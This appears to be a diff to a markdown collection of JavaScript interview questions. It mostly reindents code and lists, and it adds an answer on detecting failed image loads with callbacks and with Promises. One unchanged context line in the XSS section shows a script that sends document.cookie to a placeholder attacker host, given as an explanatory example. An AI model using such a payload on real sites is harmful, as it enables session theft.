@@ -15,17 +15,17 @@
 - 4 When is prototypal inheritance an appropriate choice? \(whenever you need inheritance\)
 - 5. Use of 'prototype' vs. 'this' in JavaScript?
 - 6. What are the pros and cons of functional programming vs object-oriented programming?
-    - OOP
-    - Functional Programming
+  - OOP
+  - Functional Programming
 - 7. What does “favor object composition over class inheritance” mean?
 - 8. What are two-way data binding and one-way data flow, and how are they different?
 - 9. What are the pros and cons of monolithic vs microservice architectures?
-    - Monolithic
-    - Micro Service
+  - Monolithic
+  - Micro Service
 - 10. What is asynchronous programming, and why is it important in JavaScript?
 - 11.1 Concurrency model and Event Loop in Javascript
-    - Eventloop
-    - Non-blocking I/O
+  - Eventloop
+  - Non-blocking I/O
 - 11.2 Trick to eliminate stackoverflow on loop function
 - 12.1 null vs. undefined
 - 12.2 Difference between undefined and not defined in JavaScript
@@ -39,19 +39,19 @@
 - 17. Explain **delete** operator and what it does
 - 18. What is JavaScript Self-Invoking anonymous function or Self-Executing anonymous function.
 - 19.1 What is the difference between array vs. object?
-    - Object / Associative Array
-    - Array
+  - Object / Associative Array
+  - Array
 - 19.2 How to check if an object is an array or not?
 - 19.3 What are the way by which we can create object in JavaScript? - 3 ways
-    - \(1\) Function Based
-    - \(2\) Object Literal
-    - \(3\) Using JavaScript "new" keyword \(constructor way\)
+  - \(1\) Function Based
+  - \(2\) Object Literal
+  - \(3\) Using JavaScript "new" keyword \(constructor way\)
 - 19.4 How to empty an array in JavaScript? -- 4 methods
 - 21. What is "this" in JS?
 - 22. What are differences between host object and native object?
-    - Native object
-    - Host object
-    - User object
+  - Native object
+  - Host object
+  - User object
 - 23. Why extending build in JavaScript object is a bad idea?
 - 24.1 Why does nearly every object have a toString method?
 - 24.2 what's different between Object.prototype.toString.call and typeof?
@@ -66,20 +66,20 @@
 - 28. What are the benefits of including 'use strict' at the beginning of a JavaScript source file? -- Good practice
 - 28. What is a closure in JS?
 - 29. Javascript Timer -- Difference between setTimeout\(\) and setInterval\(\)?
-    - setTimeout\(\)/clearTimeout\(\)
-    - setInterval\(\)/clearInterval\(\)
+  - setTimeout\(\)/clearTimeout\(\)
+  - setInterval\(\)/clearInterval\(\)
 - 30. Graceful Degradation vs. Progressive Enhancement?
 - 31. How are errors gracefully handled in JavaScript?
 - 32. How to handle cross domain request in JavaScript?
-    - CORS \(Cross-Origin Resource Sharing\)
-    - JSONP \(JavaScript Object Notation with Padding\)
-    - SERVER-SIDE PROXY
+  - CORS \(Cross-Origin Resource Sharing\)
+  - JSONP \(JavaScript Object Notation with Padding\)
+  - SERVER-SIDE PROXY
 - 33. Function declaration \(Defined at run time vs. defined at parse time\)
 - 34. What is difference between private variable, public variable and static variable? How we achieve this in JS?
 - 35. CommonJS vs. AMD
 - 36. Function length and method overloading
 - 37.1 What is malicious JS and its consequences?
-        - Consequences:
+    - Consequences:
 - 37.2 What is XSS attack?
 - 38. How to set delay time for autocomplete request? \(Apple Interview\)
 - 39. HashTable in JS
@@ -91,6 +91,7 @@
 - 45. What is hoisting in JS
 - 46. Is JavaScript a pass-by-reference or pass-by-value language?
 - 47. What could cause JS memory leak?
+- 48. Detect when image fails to load in Javascript
 
 <!-- /MarkdownTOC -->
 
@@ -1435,6 +1436,7 @@ Referenced:
 <script>
 window.location='http://attacker/?cookie='+document.cookie
 </script>
+
 ```
 
 #### 38. How to set delay time for autocomplete request? (Apple Interview)
@@ -1455,6 +1457,7 @@ function onKeyUp() {
 function displaySearch() {
     alert('result');
 }
+
 ```
 
 #### 39. HashTable in JS
@@ -1466,11 +1469,11 @@ function displaySearch() {
 ```javascript
 
 Object.prototype.keys = Object.prototype.keys || function(obj) {
-    var keys = [];
-    for (var key in obj) {
-      keys.push(key);
-    }
-    return keys;
+  var keys = [];
+  for (var key in obj) {
+    keys.push(key);
+  }
+  return keys;
 }
 
 ```
@@ -1490,30 +1493,30 @@ var _idleSecondsTimer = null;
 var _idleSecondsCounter = 0;
 
 document.onclick = function() {
-    _idleSecondsCounter = 0;
+  _idleSecondsCounter = 0;
 };
 
 document.onmousemove = function() {
-    _idleSecondsCounter = 0;
+  _idleSecondsCounter = 0;
 };
 
 document.onkeypress = function() {
-    _idleSecondsCounter = 0;
+  _idleSecondsCounter = 0;
 };
 
 //polling for idle time
 _idleSecondsTimer = window.setInterval(CheckIdleTime, 1000);
 
 function CheckIdleTime() {
-    _idleSecondsCounter++;
-    var oPanel = document.getElementById("SecondsUntilExpire");
-    if (oPanel)
-        oPanel.innerHTML = (IDLE_TIMEOUT - _idleSecondsCounter) + "";
-    if (_idleSecondsCounter >= IDLE_TIMEOUT) {
-        window.clearInterval(_idleSecondsTimer);
-        alert("Time expired!");
-        document.location.href = "logout.html";
-    }
+  _idleSecondsCounter++;
+  var oPanel = document.getElementById("SecondsUntilExpire");
+  if (oPanel)
+    oPanel.innerHTML = (IDLE_TIMEOUT - _idleSecondsCounter) + "";
+  if (_idleSecondsCounter >= IDLE_TIMEOUT) {
+    window.clearInterval(_idleSecondsTimer);
+    alert("Time expired!");
+    document.location.href = "logout.html";
+  }
 }
 ```
 
@@ -1533,24 +1536,24 @@ responseEnd: This marks the time when the browser downloads the last byte of the
 
 ```javascript
 function getPageLoadTime() {
-    if (typeof(performance) !== 'undefined' && typeof(performance.timing) == 'object') {
-        var timing = performance.timing;
+  if (typeof(performance) !== 'undefined' && typeof(performance.timing) == 'object') {
+    var timing = performance.timing;
 
-        // fall back to less accurate milestones
-        var startTime = performance.timing.redirectStart ||
-                performance.timing.fetchStart ||
-                performance.timing.requestStart;
-        var endTime = performance.timing.domContentLoadedEventEnd ||
-                performance.timing.domInteractive ||
-                performance.timing.domComplete ||
-                performance.timing.loadEventComplete;
+    // fall back to less accurate milestones
+    var startTime = performance.timing.redirectStart ||
+            performance.timing.fetchStart ||
+            performance.timing.requestStart;
+    var endTime = performance.timing.domContentLoadedEventEnd ||
+            performance.timing.domInteractive ||
+            performance.timing.domComplete ||
+            performance.timing.loadEventComplete;
 
-        if (startTime && endTime && (startTime < endTime)) {
-            return (endTime - startTime);
-        }
+    if (startTime && endTime && (startTime < endTime)) {
+      return (endTime - startTime);
     }
+  }
 
-    return 'data not available';
+  return 'data not available';
 }
 
 ```
@@ -1640,17 +1643,17 @@ alert("after changeMember: " + x.member); /* change persists */ //bar
 
 ```javascript
 function foo(arg) {
-    bar = "this is a hidden global variable";
+  bar = "this is a hidden global variable";
 }
 
 //OR
 function foo() {
-    this.variable = "potential accidental global";
+  this.variable = "potential accidental global";
 }
 
 //Similar to
 function foo(arg) {
-    window.bar = "this is an explicit global variable";
+  window.bar = "this is an explicit global variable";
 }
 
 ```
@@ -1660,11 +1663,11 @@ function foo(arg) {
 ```javascript
 var someResource = getData();
 setInterval(function() {
-    var node = document.getElementById('Node'); //unused "node" should be destroyed
-    if(node) {
-        // Do stuff with node and someResource.
-        node.innerHTML = JSON.stringify(someResource);
-    }
+  var node = document.getElementById('Node'); //unused "node" should be destroyed
+  if(node) {
+    // Do stuff with node and someResource.
+    node.innerHTML = JSON.stringify(someResource);
+  }
 }, 1000);
 ```
 
@@ -1674,7 +1677,7 @@ Best practice in this case is unbind/destroy node when not used
 var element = document.getElementById('button');
 
 function onClick(event) {
-    element.innerHtml = 'text';
+  element.innerHtml = 'text';
 }
 
 element.addEventListener('click', onClick);
@@ -1698,20 +1701,79 @@ element.parentNode.removeChild(element);
 var x = [];
 
 function createSomeNodes() {
-    var div,
-        i = 100,
-        frag = document.createDocumentFragment();
-    for (;i > 0; i--) {
-        div = document.createElement("div");
-        div.appendChild(document.createTextNode(i + " - "+ new Date().toTimeString()));
-        frag.appendChild(div);
-    }
-    document.getElementById("nodes").appendChild(frag);
+  var div,
+      i = 100,
+      frag = document.createDocumentFragment();
+  for (;i > 0; i--) {
+    div = document.createElement("div");
+    div.appendChild(document.createTextNode(i + " - "+ new Date().toTimeString()));
+    frag.appendChild(div);
+  }
+  document.getElementById("nodes").appendChild(frag);
 }
 function grow() {
-    x.push(new Array(1000000).join('x'));
-    createSomeNodes();
-    setTimeout(grow,1000);
+  x.push(new Array(1000000).join('x'));
+  createSomeNodes();
+  setTimeout(grow,1000);
 }
+
+```
+
+#### 48. Detect when image fails to load in Javascript
+
+* Note: Whenever you assign onload or onerror directly, it may replace the callback that was assigned earlier. That is why there's a nice method that "registers the specified listener on the EventTarget it's called on" as they say on MDN. You can register as many listeners as you want on the same event.
+
+```javascript
+function testImage(url) {
+  var tester = new Image();
+  tester.addEventListener('load', imageFound);
+  tester.addEventListener('error', imageNotFound);
+  tester.src = url;
+}
+
+function imageFound() {
+  alert('That image is found and loaded');
+}
+
+function imageNotFound() {
+  alert('That image was not found.');
+}
+
+testImage("http://foo.com/bar.jpg");
+
+```
+
+* Now use ES6 and promise to write that function
+
+```javascript
+function testImage(url) {
+  // Define the promise
+  const imgPromise = new Promise(function(resolve, reject) {
+    // Create the image
+    const imgElement = new Image();
+
+    // When image is loaded, resolve the promise
+    imgElement.addEventListener('load', function imgOnLoad() {
+        resolve(this);
+    });
+    // When there's an error during load, reject the promise
+    imgElement.addEventListener('error', function imgOnError() {
+        reject();
+    });
+    // Assign URL
+    imgElement.src = url;
+  });
+  return imgPromise;
+}
+
+testImage("http://foo.com/bar.jpg").then(
+  function fulfilled(img) {
+    console.log('That image is found and loaded', img);
+  },
+
+  function rejected() {
+    console.log('That image was not found');
+  }
+);
 
 ```
